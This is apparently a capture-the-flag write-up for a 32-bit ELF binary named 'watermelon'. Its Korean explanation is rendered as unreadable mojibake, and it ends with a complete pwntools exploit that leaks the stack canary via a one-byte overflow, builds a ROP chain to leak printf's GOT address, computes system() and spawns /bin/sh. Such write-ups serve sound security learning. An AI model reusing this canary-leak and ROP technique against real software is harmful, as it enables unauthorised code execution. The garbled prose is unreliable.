��𼱰� ���� �� �������µ� �������� Ǭ��.

���� ���̳ʸ��� �м��غ��ڴ�.

![](https://lh6.googleusercontent.com/CEtV2ySb1Pauqv7f_VM-0rTe_cxnMbRVegCVACPt4KPs9JG1jB7sY-XdIUWPcEL-ncouqfY9Lg0eyYnVtyqYXg6qlMSeG6BZSiodj1FUmu13aeyvNlp7ubi1LfUzwmFpUUDq950X)

elf 32bit�����̴�

���̴ٷ� �м��غ��ڴ�.

![](https://lh4.googleusercontent.com/kpgapWG54gF1cBHoRpW98281ljEVqJcUZfmgcGash-N2YrXJdn-Y02r0k0TQC4oavguAFHWsHtXpAE389gkPHdYeI87O4QcD99KHYTrhcCwwGWY16F4gLwfWlYdhdfiOMXD1HrfR)

�����Լ��̴�.

�ϴ� ī������ �ִ�.

�ϴ� �̸��� ���������� �Է��� �ް� �� �̸��� ������ش�.

�׸���� ���ѷ����� ���� ���� switch�� ���ڰ��� ����.

![](https://lh4.googleusercontent.com/R_80-ss1qaejL65YO7nsTZma0o1mxONDXdDYbOj4m-ZcI0hvrMzAPvsaoVR4w9S51VsuC4t9cL4Wy_m65kAvu3Q7AN3riHk4sUb1-7JbP1DpimcN4ReDtG8Upjj91himhDckxNDG)

�޴��� �����ְ� �Է��� �ް� �������ش�.

menu�� rename�ϰڴ�.

![](https://lh4.googleusercontent.com/oWaj18XTB6EdXed26-V7wL-SI8r5Wt9b9Ia-2JN62lZdnbtviKn4nC19nEviWH8KUTQQAtC12D8YhHwADnJgaJR6bY56W3reaGRgtus17Pk5WiDrmrHgsWfDlsCA-IHlZlr4Z4eF)

case���� ���� �Ƹ� �޴��� �´� �� �Լ��� �ϰ��̴�.

�ٵ� \xff\xff\xff\xff�� �����ϱ�.

�ٷ� -1�̴�. ������ Ǫ�µ����� ��������� �Ѿ�ڴ�.

���� �޴� 1���� ����.

case 1 ���� ��쿡�� v1�� �ּҸ� ���ڷ� �Ѱ��ش�.

![](https://lh5.googleusercontent.com/6kEWQ9ZDNyOdxiQ8ioJTbZOzMciZn5ivu-hkn8XP-8_3rJdnO2Oq3lq68WxGiGQs63eJH6kLh9jvmker7Q4n8HH-KnwkbAW497T0O_06bHhjw-NrTytDsedTg8Z-AsPFBxXNkZY4)

v1�� 4400 ����Ʈ��ŭ�� ũ�⸦ �Ҵ� �޴´�.

�ٽ� case 1�� �Լ��� ����.

![](https://lh5.googleusercontent.com/IGe6N2OBicZby9bJd84K_-puz3YwTK3nfNjARaQ-RntdATFc5wdLsfbW3GiUPlVL_CQk4ZMljxmOv4K-CTq9om0Eb2Hl_TROMuOKY9t_9JGPEaePEd8g6cyg7C2gDNA8lXfvsK0F)

add music�� ���� �Ƹ� �߰����ִ� �� ����.

dword_804cB88�� �Ƹ� list�� ������ �����ִ� �׳� ī��Ʈ�ΰ� ����. �ٵ� �� ���� 100�� �Ǹ� FULL�̶�� ������ �Բ� ������ �߰��� ���� �ʴ´�.

���� read�� 44* count + a1 +4 �� ��ġ�� �Է��� �޴´�. ��ó�� add�Ҷ��� count�� 0�� ���̴�.

0�� �����غ��� *(a1+4)���� music�� name�� ����ȴ�.

���� read�� ����.

44* count + a1 +24�� count�� 0 �̸� *(a1+24)�� ���� artist�� name�� �����̴�.

���� music�� artist�� 20byte(0x15)��ŭ ���̰� ����. �ֳĸ� �׸�ŭ read�� �Է��� �����ϱ�.

�׸��� --------------------------------\n\n�� �����

44*count+a1(count�� 0�϶� a1) *a1���� count+1 �� ��µǴ� ����Ʈ ������ 1�� ����ȴ�.

count�� 99�϶� ������ �غ���. �ϸ� 4400�� �� �¾� ��������.

��� �� �Լ����� �����÷ο찡 �߻��ϱ�� �Ѵ�.

������ �ٽ����� �����÷ο�� ���� ��ã�� �� ����.

��ư v1�� 4400byte��ŭ ����ü�� �� ����.

{ ����(4)|music(20)|artist(20) } * 99 �ϴ� �� ����.

�̸�ŭ�� �м��� �ϰ� 2�� case�� �м��غ���.

![](https://lh6.googleusercontent.com/NPKrOftvaExh4RNWyOGkyo8NF5j0a9a3SkS7EGAPl4qyt0Uev6SiJkVgGriWN_bGz_FanBDUef7hPIVLJfX6A7-x0BNKKMkT88_LH1cFeOxyO9zDAKfJZKxO96nJ4EmtDsEEUiTU)

���������� v1�� ���ڷ� �Ѱ����.

���򰥸������� ���� �ǰ� �߿��ϴ�. �Ʊ�츮�� ������ ������ �ҷ��ͼ� view�� �� �ְ� ���ش�.

���⼭ �� ������ �ðŴ�. canary leak�� �����ϴ�. �����ӰԵ� 4400����Ʈ ���� �ٷ� ī���������� �� �� �˼� �ִ�. add list�� 100���� �˲� ä���� �� 1byteħ���ϸ� ī������ leak �� �� ���� �� �̴�.

������ �հ� ������ �´�.

����° case�� ����.

![](https://lh5.googleusercontent.com/sVhFOG1TK6zoc1XKVfFbZ70-Q47G8Kyt3bQirErjZIs2ziz3zvEeWL1wXqtYb5KetXtio6JPoTsaJwf-fqunSIsfugAMqP3U_w7R5kSBfQs7WMk6InJsaliTjaa-GivMnglir5Ml)

���� �߰��ߴ� ������ ������ �� �ִ�.

����? �ٵ� bof�� �����ϴ�. ��� ������ list�� artist�� bof�Ͽ� rop�ϸ� ���� ���� �� ���� ���̴�.

(���⿣ system�Լ��� ��� offset�� ���ؾ� �Ѵ�.

�ؿ��� ���̷ε��̴�.

```python
from pwn import  *

s = process("./watermelon")

e = ELF("./watermelon")

read_plt = e.plt['read']

read_got = e.got['read']

write_plt =  0x8048590

printf_plt =  0x8048500

pppr =  0x8048f0d

cmd =  0x804d7a0

printf_got =  0x804c010

s.recvuntil('Input your name : ')

s.sendline("/bin/sh\x00")

s.recvuntil('\tselect\t|\t')

for i in  range(0,100):

s.sendline('1')

s.recv()

s.send("asdf")

s.recv()

s.send("asdf")

s.recvuntil("\tselect\t|\t")

s.sendline('3')

s.recvuntil("select number\t|\t\n")

s.sendline('100')

s.recvuntil("\tmusic\t|\t")

s.send("asdf")

s.recv()

s.send("A"*21)

s.recvuntil("\tselect\t|\t\n")

s.sendline('2')

s.recvuntil('AAAAAAAAAAAAAAAAAAAAA')

canary =  '\x00'  + s.recv(3)

print ("[*]canary : 0x%x"%u32(canary))
```
# canary leak success
```python
s.recvuntil("\tselect\t|\t")

s.sendline('3')

s.recvuntil("select number\t|\t\n")

s.sendline('100')

s.recvuntil("\tmusic\t|\t")

s.send("asdf")

s.recv()
```
# leak_printf === payload
```python
leak_printf="A"*20

leak_printf+=canary

leak_printf+="A"*12

leak_printf+= p32(write_plt)

leak_printf+= p32(pppr)

leak_printf+= p32(1)

leak_printf+= p32(printf_got)

leak_printf+= p32(4)

leak_printf+= p32(read_plt)

leak_printf+= p32(pppr)

leak_printf+= p32(0)

leak_printf+= p32(read_got)

leak_printf+= p32(4)

#leak_printf+= "\x90\x94\x04\x08"

leak_printf+= p32(read_plt)

leak_printf+=  'AAAA'

leak_printf+= p32(cmd)

s.sendline(leak_printf)

s.recvuntil("\tselect\t|\t\n")

s.sendline('4')

s.recvuntil("\t\tBYE BYE\n\n")

#s.sendline('/bin/sh\x00')

#print(hex(u32(s.recv(4))))

printf = u32(s.recv(4))

#print("[*]printf : 0x%x"%(printf))

system = (printf) -  0xe6e0

#print("[*]system : 0x%x"%system)

s.send(p32(system))

s.interactive()
```
